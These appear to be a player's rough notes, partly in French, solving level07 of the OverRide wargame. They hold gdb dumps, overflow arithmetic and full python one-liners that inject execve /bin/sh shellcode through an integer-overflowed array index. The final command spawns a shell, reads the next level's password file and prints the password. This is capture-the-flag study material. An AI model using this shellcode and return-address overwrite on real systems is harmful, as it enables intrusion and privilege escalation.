
V6 ARRAY
(gdb) x/wx $esp + 0x24
0xffffd544:     0x00000000

RET ADDR
(gdb) x/wx $esp
0xffffd70c:     0xf7e45513

S ARRAY
(gdb) x/s $esp + 0x1b8
0xffffd6d8:      "store" = 4294956760

Breakpoint 4, 0x080486d6 in store_number ()
(gdb) x/wx $esp
0xffffd51c:     0x080488ef


0xffffd51c - 0xffffd544 = 0x1c8 (456)


456 / 4 = 114

unit max = 4294967295 / 4 (car il fait un *4) + 456 / 4 car int  = 114


a test = (4294967295 / 4)  + (456 / 4)
1073741937.75 

a test = (4294967295 + 456) / 4
1073741937.75

a test = (4294967295) / 4 + 114
1073741937.75

in int =  1073741938 ? or 1073741937


114


find !
(python -c "print ('store\n4159090384\n1073741938\n' + 'store\n4294956764\n!!!!!!!!!!!!!\n' + 'quitsh\n')") | /home/users/level07/level07

overflow for ret addr = 1073741938 = 114


68732f = /sh = 6845231

6e69622f = /bin = 1852400175

26739 = sh

store 0

114 + 32 = 146

stack main = 456

ret = 456 -> stack main = 464

114 - 7 + 5

111

 <<< $(python -c "print ('store\n4159090384\n1073741938\n' + 'store\n4294956764\n1\n')")


60 / 4 = 15


4294956820 - 4294956760



b7d8ffff

0xffffd708

0xffffd6d4 = 01 = 0xffffd4b0 = 0xffffd400

v6 array de [1] = 
(gdb) p 0xffffd548 + 27 = 4294956468
$1 = 4294956360

transform shell code:


\x31\xc0\x50\x68 = 6850c031 = 1750122545 = 28

\x2f\x2f\x73\x68 = 68732f2f = 1752379183 = 29

\x68\x2f\x62\x69 = 69622f68 = 1768042344 = 1073741854

\x6e\x89\xe3\x50 = 50e3896e = 1357089134 = 31

\x53\x89\xe1\x99 = 99e18953 = 2581694803 = 32

\xb0\x0b\xcd\x80 = 80cd0bb0 = 2160921520 = 1073741857

(python -c "print ('store\n1750122545\n28\n' + 'store\n1752379183\n29\n' + 'store\n1768042344\n1073741854\n' + 'store\n1357089134\n31\n' + 'store\n2581694803\n32\n' + 'store\n2160921520\n1073741857\n' + 'store\n4294956468\n1073741938\n' + 'quit\n')") | /home/users/level07/level07

\x31\xc0\x50\x68
\x2f\x2f\x73\x68 
\x68\x2f\x62\x69 
\x6e\x89\xe3\x50
\x53\x89\xe1\x99 
\xb0\x0b\xcd\x80

in real prog need -16 to index

.........................................................

level07@OverRide:~$ (python -c "print ('store\n1750122545\n28\n' + 'store\n1752379183\n29\n' + 'store\n1768042344\n1073741854\n' + 'store\n1357089134\n31\n' + 'store\n2581694803\n32\n' + 'store\n2160921520\n1073741857\n' + 'store\n4294956452\n1073741938\n' + 'quit\n')"; echo 'cat /home/users/level08/.pass') | /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

1000 0000 0000 0111
-32761